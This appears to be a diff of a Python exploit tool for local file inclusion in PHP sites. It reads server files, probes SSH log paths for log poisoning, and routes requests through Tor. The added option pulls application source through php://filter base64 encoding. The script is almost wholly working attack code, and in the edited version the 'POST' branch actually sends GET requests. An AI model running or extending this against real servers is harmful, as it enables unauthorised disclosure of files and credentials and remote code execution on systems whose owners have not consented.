@@ -1,5 +1,6 @@
 #!/usr/bin/env python3.11
 import requests
+import re
 import urllib3
 import argparse
 import paramiko
@@ -14,7 +15,7 @@ COMMON_LOG_FILES = [
     "/var/log/syslog",
 ]
 
-def detect_log_file(url, param, method="POST", proxies=None):
+def detect_log_file(url, param, method="GET", proxies=None):
     print("[*] Searching for SSH log file...")
     for log_file in COMMON_LOG_FILES:
         response = exploit_lfi(url, param, log_file, method, proxies)
@@ -24,21 +25,68 @@ def detect_log_file(url, param, method="POST", proxies=None):
     print("[-] No log files found. Try specifying manually.")
     return None
 
-def exploit_lfi(url, param, lfi_payload, method="POST", proxies=None):
+def exploit_lfi(url, param, lfi_payload, method="GET", proxies=None):
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
     if method.upper() == "POST":
-        response = requests.post(url, data={param: lfi_payload}, verify=False, proxies=proxies)
+        print(f"[DEBUG] Sending payload: {lfi_payload}")
+        response = requests.get(
+            url,
+            params={param: lfi_payload},
+            verify=False,
+            proxies=proxies
+        )
+        print(f"[DEBUG] Final URL: {response.url}")
+
     elif method.upper() == "GET":
-        response = requests.get(f"{url}?{param}={lfi_payload}", verify=False, proxies=proxies)
+        print(f"[DEBUG] Sending payload: {lfi_payload}")
+        response = requests.get(
+            url,
+            params={param: lfi_payload},
+            verify=False,
+            proxies=proxies
+        )
+        print(f"[DEBUG] Final URL: {response.url}")
     else:
         print("Unsupported method, try again...")
         return None
 
     if response.status_code != 200:
-        raise Exception("Failed to exploit LFI vulnerability")
+        print(f"[!] Unexpected status code: {response.status_code}")
     
     return response
+
+def php_filter_base64(url, param, filename, method="GET", proxies=None):
+    print("[*] Encoding php output in base64...")
+    php_filter = "php://filter/convert.base64-encode/resource="
+    filename = php_filter + filename
+
+    response = exploit_lfi(url, param, filename, method, proxies)
+    print("\n[DEBUG] FULL RESPONSE:\n")
+    print(response.text)
+
+    print("[*] Searching for base64...")
+    
+    # Looser regex for finding base64 inside responses
+    matches = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', response.text)
+
+    if not matches:
+        print("[!] No base64 data found")
+        print("[DEBUG] Response preview:\n", response.text[:500])
+        return None
+
+    # Try decoding each match until one works
+    for candidate in matches:
+        try:
+            decoded = base64.b64decode(candidate, validate=True).decode(errors="ignore")
+            print("[+] Successfully decoded payload:")
+            print(decoded)
+            return decoded
+        except Exception:
+            continue
+
+    print("[!] Found base64 candidates but decoding failed")
+    return None
 
 def session_exploit(url, cookie, param, lfi_payload, proxies=None):
     session = requests.Session()
@@ -84,6 +132,8 @@ def main():
     parser.add_argument("--cookie", help="The PHPSESSID cookie in case the vulnerability is authenticated.")
     parser.add_argument("--log-file", help="The log file to search for.")
     parser.add_argument("--tor", action="store_true", help="Use Tor to proxy the requests.")
+    # Create the optional argument for php filters
+    parser.add_argument("--php-filter", action="store_true", help="Use PHP filters to decode base64.")
 
     args = parser.parse_args()
     
@@ -108,9 +158,26 @@ def main():
         
         ssh_log_poison(target_ip, use_tor=args.tor)  # Now supports Tor!
 
-    if not args.tor:
-        response = exploit_lfi(args.url, args.param, args.lfi_payload, args.method, proxies)
+    if args.php_filter:
+        result = php_filter_base64(
+            args.url,
+            args.param,
+            args.lfi_payload,
+            args.method,
+            proxies
+        )
+        print(result)
+
+    else:
+        response = exploit_lfi(
+            args.url,
+            args.param,
+            args.lfi_payload,
+            args.method,
+            proxies
+        )
         print(response.text)
-    
+        
 if __name__ == "__main__":
     main()
+
